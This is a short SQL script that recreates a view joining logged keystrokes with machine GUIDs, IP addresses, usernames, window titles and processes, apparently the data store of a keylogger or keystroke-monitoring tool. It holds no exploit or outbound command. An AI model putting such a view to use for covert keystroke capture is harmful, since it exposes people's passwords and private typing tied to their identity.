DROP VIEW main_logs_view;

CREATE VIEW main_logs_view AS
SELECT 
	
	datetime(logs.timestamp, 'unixepoch') AS time,
	machines.guid,
	ip_addresses.ipv4,
	windows.name,
	windows.process,
	users.username,
	
	logs.keystrokes
	
FROM logs
	INNER JOIN machines ON logs.machine_id = machines.id
	LEFT JOIN ip_addresses ON  ip_addresses.id = logs.ip_id
	INNER JOIN users ON users.id = logs.user_id AND users.machine_id = machines.id
	INNER JOIN windows ON windows.id = logs.window_id
